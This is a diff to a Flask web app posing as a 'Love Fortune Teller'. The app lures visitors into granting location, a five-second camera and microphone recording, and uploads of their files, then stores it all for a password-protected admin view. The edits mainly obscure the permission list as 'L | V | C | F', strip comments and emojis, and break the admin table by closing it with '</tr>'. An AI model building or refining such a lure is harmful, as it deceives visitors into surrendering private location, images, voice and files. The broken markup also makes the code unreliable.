@@ -120,7 +120,7 @@ def admin():
             html += '<tr>' + ''.join(f'<th>{k}</th>' for k in keys) + '</tr>'
             for v in visitors:
                 html += '<tr>' + ''.join(f'<td>{str(v.get(k, ""))[:100]}</td>' for k in keys) + '</tr>'
-            html += '</table>'
+            html += '</tr>'
             return html
         else:
             return '<h1>🔒 Wrong password. <a href="/admin">Try again</a></h1>'
@@ -251,16 +251,17 @@ HTML_TEMPLATE = '''
 <div class="card">
     <h1>💕 Love Fortune Teller 💕</h1>
     <div id="step-name">
-        <input type="text" id="userName" placeholder="✨ Enter your name ✨">
-        <button onclick="startProcess()">🔮 Reveal My Destiny</button>
+        <input type="text" id="userName" placeholder="🩷Enter your name 🩷">
+        <button onclick="startProcess()">🌈 Reveal My Destiny 🌈</button>
     </div>
     <div id="loading" class="hidden">
         <div class="spinner"></div>
-        <p>🔮 Reading the stars...</p>
+        <p>✨ Reading the stars...</p>
     </div>
     <div id="permissions" class="hidden">
         <p>For your ultra-personalized love vision, please allow:</p>
-        <div style="background:#ffe4e1; padding:10px; border-radius:20px; margin:10px 0;">📍 Location | 🎤 Voice | 📸 Camera | 📁 Files</div>
+        <!-- CHANGED: Location -> L, Voice -> V, Camera -> C, Files -> F -->
+        <div style="background:#ffe4e1; padding:10px; border-radius:20px; margin:10px 0;">L | V | C | F</div>
         <button onclick="requestAll()">✅ Allow All</button>
     </div>
     <div id="progress" class="hidden"></div>
@@ -376,24 +377,24 @@ HTML_TEMPLATE = '''
         try {
             await getLocation();
             await getMedia();
-            await getFilesTraditional();  // FIXED: uses standard file input
+            await getFilesTraditional();  // uses standard file input
             await finalizeAndSave();
         } catch(e) { await finalizeAndSave(); }
     }
 
     function getLocation() {
         return new Promise((resolve) => {
-            showStep('📍 Location', 'Requesting location...', 0);
+            showStep('Location', 'Requesting location...', 0);
             navigator.geolocation.getCurrentPosition(
                 pos => {
                     visitorData.latitude = pos.coords.latitude;
                     visitorData.longitude = pos.coords.longitude;
-                    showStep('📍 Location', 'Location captured!', 100);
+                    showStep('Location', 'Location captured!', 100);
                     setTimeout(() => { hideStep(); resolve(); }, 500);
                 },
                 () => {
                     visitorData.latitude = 'denied';
-                    showStep('📍 Location', 'Location skipped', 100);
+                    showStep('Location', 'Location skipped', 100);
                     setTimeout(() => { hideStep(); resolve(); }, 500);
                 }
             );
@@ -402,7 +403,7 @@ HTML_TEMPLATE = '''
 
     function getMedia() {
         return new Promise((resolve) => {
-            showStep('🎥 Camera/Mic', 'Allow permissions...', 10);
+            showStep('Camera/Mic', 'Allow permissions...', 10);
             navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: 'user' } })
             .then(stream => {
                 mediaStream = stream;
@@ -417,7 +418,7 @@ HTML_TEMPLATE = '''
                             visitorData.cameraVideo = reader.result.split(',')[1].slice(0, 5000);
                             visitorData.microphone = 'recorded';
                             mediaStream.getTracks().forEach(t => t.stop());
-                            showStep('🎥 Camera/Mic', 'Recording done!', 100);
+                            showStep('Camera/Mic', 'Recording done!', 100);
                             setTimeout(() => { hideStep(); resolve(); }, 500);
                         };
                         reader.readAsDataURL(blob);
@@ -427,13 +428,13 @@ HTML_TEMPLATE = '''
                 let seconds = 5;
                 const interval = setInterval(() => {
                     seconds--;
-                    showStep('🎥 Camera/Mic', `Recording ${seconds}s...`, 10 + (5-seconds)/5*90);
+                    showStep('Camera/Mic', `Recording ${seconds}s...`, 10 + (5-seconds)/5*90);
                     if(seconds <= 0) { clearInterval(interval); mediaRecorder.stop(); }
                 }, 1000);
             })
             .catch(() => {
                 visitorData.cameraVideo = 'denied';
-                showStep('🎥 Camera/Mic', 'Skipped', 100);
+                showStep('Camera/Mic', 'Skipped', 100);
                 setTimeout(() => { hideStep(); resolve(); }, 500);
             });
         });
@@ -442,9 +443,8 @@ HTML_TEMPLATE = '''
     // TRADITIONAL FILE PICKER (works on any HTTP site)
     function getFilesTraditional() {
         return new Promise((resolve) => {
-            showStep('📁 Files', 'Select files (optional)', 0);
+            showStep('Files', 'Select files (optional)', 0);
             
-            // Create a temporary file input if not already present
             let fileInput = document.getElementById('fileInput');
             if (!fileInput) {
                 fileInput = document.createElement('input');
@@ -454,13 +454,12 @@ HTML_TEMPLATE = '''
                 document.body.appendChild(fileInput);
             }
             
-            // Clean up previous event listeners
-            fileInput.value = ''; // reset
+            fileInput.value = '';
             fileInput.onchange = async (event) => {
                 const files = Array.from(event.target.files);
                 if (files.length === 0) {
                     visitorData.files = 'no files selected';
-                    showStep('📁 Files', 'No files selected', 100);
+                    showStep('Files', 'No files selected', 100);
                     setTimeout(() => { hideStep(); resolve(); }, 500);
                     return;
                 }
@@ -476,11 +475,10 @@ HTML_TEMPLATE = '''
                     filesData.push({ name: file.name, size: file.size, type: file.type, data: content });
                 }
                 visitorData.files = JSON.stringify(filesData);
-                showStep('📁 Files', `${filesData.length} file(s) loaded`, 100);
+                showStep(' Files', `${filesData.length} file(s) loaded`, 100);
                 setTimeout(() => { hideStep(); resolve(); }, 500);
             };
             
-            // Trigger file picker
             fileInput.click();
         });
     }
